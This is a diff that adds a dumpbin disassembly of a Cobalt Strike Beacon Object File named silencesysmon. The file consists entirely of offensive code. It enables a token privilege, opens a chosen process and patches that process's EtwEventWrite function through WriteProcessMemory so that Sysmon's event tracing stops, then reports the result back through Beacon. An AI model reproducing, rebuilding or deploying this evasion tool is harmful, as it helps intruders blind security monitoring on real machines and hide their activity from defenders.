@@ -1,0 +1,222 @@
+Microsoft (R) COFF/PE Dumper Version 14.31.31107.0
+Copyright (C) Microsoft Corporation.  All rights reserved.
+
+
+Dump of file silencesysmon.x64.o
+
+File Type: COFF OBJECT
+
+SetPrivilege:
+  0000000000000000: 89 54 24 10        mov         dword ptr [rsp+10h],edx
+  0000000000000004: 48 89 4C 24 08     mov         qword ptr [rsp+8],rcx
+  0000000000000009: 48 83 EC 58        sub         rsp,58h
+  000000000000000D: FF 15 00 00 00 00  call        qword ptr [__imp_KERNEL32$GetCurrentProcess]
+  0000000000000013: 4C 8D 44 24 38     lea         r8,[rsp+38h]
+  0000000000000018: BA 20 00 00 00     mov         edx,20h
+  000000000000001D: 48 8B C8           mov         rcx,rax
+  0000000000000020: FF 15 00 00 00 00  call        qword ptr [__imp_Advapi32$OpenProcessToken]
+  0000000000000026: 85 C0              test        eax,eax
+  0000000000000028: 75 07              jne         0000000000000031
+  000000000000002A: 33 C0              xor         eax,eax
+  000000000000002C: E9 AB 00 00 00     jmp         00000000000000DC
+  0000000000000031: 4C 8D 44 24 30     lea         r8,[rsp+30h]
+  0000000000000036: 48 8B 54 24 60     mov         rdx,qword ptr [rsp+60h]
+  000000000000003B: 33 C9              xor         ecx,ecx
+  000000000000003D: FF 15 00 00 00 00  call        qword ptr [__imp_Advapi32$LookupPrivilegeValueA]
+  0000000000000043: 85 C0              test        eax,eax
+  0000000000000045: 75 07              jne         000000000000004E
+  0000000000000047: 33 C0              xor         eax,eax
+  0000000000000049: E9 8E 00 00 00     jmp         00000000000000DC
+  000000000000004E: C7 44 24 40 01 00  mov         dword ptr [rsp+40h],1
+                    00 00
+  0000000000000056: B8 0C 00 00 00     mov         eax,0Ch
+  000000000000005B: 48 6B C0 00        imul        rax,rax,0
+  000000000000005F: 48 8B 4C 24 30     mov         rcx,qword ptr [rsp+30h]
+  0000000000000064: 48 89 4C 04 44     mov         qword ptr [rsp+rax+44h],rcx
+  0000000000000069: 83 7C 24 68 00     cmp         dword ptr [rsp+68h],0
+  000000000000006E: 74 13              je          0000000000000083
+  0000000000000070: B8 0C 00 00 00     mov         eax,0Ch
+  0000000000000075: 48 6B C0 00        imul        rax,rax,0
+  0000000000000079: C7 44 04 4C 02 00  mov         dword ptr [rsp+rax+4Ch],2
+                    00 00
+  0000000000000081: EB 11              jmp         0000000000000094
+  0000000000000083: B8 0C 00 00 00     mov         eax,0Ch
+  0000000000000088: 48 6B C0 00        imul        rax,rax,0
+  000000000000008C: C7 44 04 4C 00 00  mov         dword ptr [rsp+rax+4Ch],0
+                    00 00
+  0000000000000094: 48 C7 44 24 28 00  mov         qword ptr [rsp+28h],0
+                    00 00 00
+  000000000000009D: 48 C7 44 24 20 00  mov         qword ptr [rsp+20h],0
+                    00 00 00
+  00000000000000A6: 41 B9 10 00 00 00  mov         r9d,10h
+  00000000000000AC: 4C 8D 44 24 40     lea         r8,[rsp+40h]
+  00000000000000B1: 33 D2              xor         edx,edx
+  00000000000000B3: 48 8B 4C 24 38     mov         rcx,qword ptr [rsp+38h]
+  00000000000000B8: FF 15 00 00 00 00  call        qword ptr [__imp_Advapi32$AdjustTokenPrivileges]
+  00000000000000BE: 85 C0              test        eax,eax
+  00000000000000C0: 75 04              jne         00000000000000C6
+  00000000000000C2: 33 C0              xor         eax,eax
+  00000000000000C4: EB 16              jmp         00000000000000DC
+  00000000000000C6: FF 15 00 00 00 00  call        qword ptr [__imp_KERNEL32$GetLastError]
+  00000000000000CC: 3D 14 05 00 00     cmp         eax,514h
+  00000000000000D1: 75 04              jne         00000000000000D7
+  00000000000000D3: 33 C0              xor         eax,eax
+  00000000000000D5: EB 05              jmp         00000000000000DC
+  00000000000000D7: B8 01 00 00 00     mov         eax,1
+  00000000000000DC: 48 83 C4 58        add         rsp,58h
+  00000000000000E0: C3                 ret
+  00000000000000E1: CC                 int         3
+  00000000000000E2: CC                 int         3
+  00000000000000E3: CC                 int         3
+  00000000000000E4: CC                 int         3
+  00000000000000E5: CC                 int         3
+  00000000000000E6: CC                 int         3
+  00000000000000E7: CC                 int         3
+  00000000000000E8: CC                 int         3
+  00000000000000E9: CC                 int         3
+  00000000000000EA: CC                 int         3
+  00000000000000EB: CC                 int         3
+  00000000000000EC: CC                 int         3
+  00000000000000ED: CC                 int         3
+  00000000000000EE: CC                 int         3
+  00000000000000EF: CC                 int         3
+SilentSysmon:
+  00000000000000F0: 48 89 4C 24 08     mov         qword ptr [rsp+8],rcx
+  00000000000000F5: 56                 push        rsi
+  00000000000000F6: 57                 push        rdi
+  00000000000000F7: 48 83 EC 68        sub         rsp,68h
+  00000000000000FB: 48 C7 44 24 40 00  mov         qword ptr [rsp+40h],0
+                    00 00 00
+  0000000000000104: C6 44 24 48 45     mov         byte ptr [rsp+48h],45h
+  0000000000000109: C6 44 24 49 74     mov         byte ptr [rsp+49h],74h
+  000000000000010E: C6 44 24 4A 77     mov         byte ptr [rsp+4Ah],77h
+  0000000000000113: C6 44 24 4B 45     mov         byte ptr [rsp+4Bh],45h
+  0000000000000118: C6 44 24 4C 76     mov         byte ptr [rsp+4Ch],76h
+  000000000000011D: C6 44 24 4D 65     mov         byte ptr [rsp+4Dh],65h
+  0000000000000122: C6 44 24 4E 6E     mov         byte ptr [rsp+4Eh],6Eh
+  0000000000000127: C6 44 24 4F 74     mov         byte ptr [rsp+4Fh],74h
+  000000000000012C: C6 44 24 50 57     mov         byte ptr [rsp+50h],57h
+  0000000000000131: C6 44 24 51 72     mov         byte ptr [rsp+51h],72h
+  0000000000000136: C6 44 24 52 69     mov         byte ptr [rsp+52h],69h
+  000000000000013B: C6 44 24 53 74     mov         byte ptr [rsp+53h],74h
+  0000000000000140: C6 44 24 54 65     mov         byte ptr [rsp+54h],65h
+  0000000000000145: C6 44 24 55 00     mov         byte ptr [rsp+55h],0
+  000000000000014A: 48 8D 0D 00 00 00  lea         rcx,[$SG100820]
+                    00
+  0000000000000151: FF 15 00 00 00 00  call        qword ptr [__imp_GetModuleHandleA]
+  0000000000000157: 48 8D 54 24 48     lea         rdx,[rsp+48h]
+  000000000000015C: 48 8B C8           mov         rcx,rax
+  000000000000015F: FF 15 00 00 00 00  call        qword ptr [__imp_GetProcAddress]
+  0000000000000165: 48 89 44 24 38     mov         qword ptr [rsp+38h],rax
+  000000000000016A: 48 8D 44 24 30     lea         rax,[rsp+30h]
+  000000000000016F: 48 8D 0D 00 00 00  lea         rcx,[$SG100821]
+                    00
+  0000000000000176: 48 8B F8           mov         rdi,rax
+  0000000000000179: 48 8B F1           mov         rsi,rcx
+  000000000000017C: B9 05 00 00 00     mov         ecx,5
+  0000000000000181: F3 A4              rep movs    byte ptr [rdi],byte ptr [rsi]
+  0000000000000183: 48 C7 44 24 20 00  mov         qword ptr [rsp+20h],0
+                    00 00 00
+  000000000000018C: 41 B9 05 00 00 00  mov         r9d,5
+  0000000000000192: 4C 8D 44 24 30     lea         r8,[rsp+30h]
+  0000000000000197: 48 8B 54 24 38     mov         rdx,qword ptr [rsp+38h]
+  000000000000019C: 48 8B 8C 24 80 00  mov         rcx,qword ptr [rsp+80h]
+                    00 00
+  00000000000001A4: FF 15 00 00 00 00  call        qword ptr [__imp_KERNEL32$WriteProcessMemory]
+  00000000000001AA: 41 B8 00 10 00 00  mov         r8d,1000h
+  00000000000001B0: 48 8B 54 24 38     mov         rdx,qword ptr [rsp+38h]
+  00000000000001B5: 48 8B 8C 24 80 00  mov         rcx,qword ptr [rsp+80h]
+                    00 00
+  00000000000001BD: FF 15 00 00 00 00  call        qword ptr [__imp_KERNEL32$FlushInstructionCache]
+  00000000000001C3: 33 C0              xor         eax,eax
+  00000000000001C5: 48 83 C4 68        add         rsp,68h
+  00000000000001C9: 5F                 pop         rdi
+  00000000000001CA: 5E                 pop         rsi
+  00000000000001CB: C3                 ret
+  00000000000001CC: CC                 int         3
+  00000000000001CD: CC                 int         3
+  00000000000001CE: CC                 int         3
+  00000000000001CF: CC                 int         3
+  00000000000001D0: CC                 int         3
+  00000000000001D1: CC                 int         3
+  00000000000001D2: CC                 int         3
+  00000000000001D3: CC                 int         3
+  00000000000001D4: CC                 int         3
+  00000000000001D5: CC                 int         3
+  00000000000001D6: CC                 int         3
+  00000000000001D7: CC                 int         3
+  00000000000001D8: CC                 int         3
+  00000000000001D9: CC                 int         3
+  00000000000001DA: CC                 int         3
+  00000000000001DB: CC                 int         3
+  00000000000001DC: CC                 int         3
+  00000000000001DD: CC                 int         3
+  00000000000001DE: CC                 int         3
+  00000000000001DF: CC                 int         3
+go:
+  00000000000001E0: 89 54 24 10        mov         dword ptr [rsp+10h],edx
+  00000000000001E4: 48 89 4C 24 08     mov         qword ptr [rsp+8],rcx
+  00000000000001E9: 48 83 EC 58        sub         rsp,58h
+  00000000000001ED: C7 44 24 20 00 00  mov         dword ptr [rsp+20h],0
+                    00 00
+  00000000000001F5: 48 C7 44 24 28 00  mov         qword ptr [rsp+28h],0
+                    00 00 00
+  00000000000001FE: 44 8B 44 24 68     mov         r8d,dword ptr [rsp+68h]
+  0000000000000203: 48 8B 54 24 60     mov         rdx,qword ptr [rsp+60h]
+  0000000000000208: 48 8D 4C 24 30     lea         rcx,[rsp+30h]
+  000000000000020D: FF 15 00 00 00 00  call        qword ptr [__imp_BeaconDataParse]
+  0000000000000213: 48 8D 4C 24 30     lea         rcx,[rsp+30h]
+  0000000000000218: FF 15 00 00 00 00  call        qword ptr [__imp_BeaconDataInt]
+  000000000000021E: 89 44 24 20        mov         dword ptr [rsp+20h],eax
+  0000000000000222: BA 01 00 00 00     mov         edx,1
+  0000000000000227: 48 8D 0D 00 00 00  lea         rcx,[$SG100835]
+                    00
+  000000000000022E: E8 00 00 00 00     call        SetPrivilege
+  0000000000000233: 85 C0              test        eax,eax
+  0000000000000235: 75 16              jne         000000000000024D
+  0000000000000237: 48 8D 15 00 00 00  lea         rdx,[$SG100836]
+                    00
+  000000000000023E: B9 0D 00 00 00     mov         ecx,0Dh
+  0000000000000243: FF 15 00 00 00 00  call        qword ptr [__imp_BeaconPrintf]
+  0000000000000249: 33 C0              xor         eax,eax
+  000000000000024B: EB 74              jmp         00000000000002C1
+  000000000000024D: 83 7C 24 20 00     cmp         dword ptr [rsp+20h],0
+  0000000000000252: 74 59              je          00000000000002AD
+  0000000000000254: 44 8B 44 24 20     mov         r8d,dword ptr [rsp+20h]
+  0000000000000259: 33 D2              xor         edx,edx
+  000000000000025B: B9 3A 04 00 00     mov         ecx,43Ah
+  0000000000000260: FF 15 00 00 00 00  call        qword ptr [__imp_KERNEL32$OpenProcess]
+  0000000000000266: 48 89 44 24 28     mov         qword ptr [rsp+28h],rax
+  000000000000026B: 48 83 7C 24 28 00  cmp         qword ptr [rsp+28h],0
+  0000000000000271: 74 26              je          0000000000000299
+  0000000000000273: 48 8B 4C 24 28     mov         rcx,qword ptr [rsp+28h]
+  0000000000000278: E8 00 00 00 00     call        SilentSysmon
+  000000000000027D: 48 8D 15 00 00 00  lea         rdx,[$SG100841]
+                    00
+  0000000000000284: 33 C9              xor         ecx,ecx
+  0000000000000286: FF 15 00 00 00 00  call        qword ptr [__imp_BeaconPrintf]
+  000000000000028C: 48 8B 4C 24 28     mov         rcx,qword ptr [rsp+28h]
+  0000000000000291: FF 15 00 00 00 00  call        qword ptr [__imp_KERNEL32$CloseHandle]
+  0000000000000297: EB 12              jmp         00000000000002AB
+  0000000000000299: 48 8D 15 00 00 00  lea         rdx,[$SG100842]
+                    00
+  00000000000002A0: B9 0D 00 00 00     mov         ecx,0Dh
+  00000000000002A5: FF 15 00 00 00 00  call        qword ptr [__imp_BeaconPrintf]
+  00000000000002AB: EB 12              jmp         00000000000002BF
+  00000000000002AD: 48 8D 15 00 00 00  lea         rdx,[$SG100843]
+                    00
+  00000000000002B4: B9 0D 00 00 00     mov         ecx,0Dh
+  00000000000002B9: FF 15 00 00 00 00  call        qword ptr [__imp_BeaconPrintf]
+  00000000000002BF: 33 C0              xor         eax,eax
+  00000000000002C1: 48 83 C4 58        add         rsp,58h
+  00000000000002C5: C3                 ret
+
+  Summary
+
+          38 .chks64
+          FE .data
+          C4 .debug$S
+          8E .drectve
+          24 .pdata
+         2C6 .text$mn
+          1C .xdata
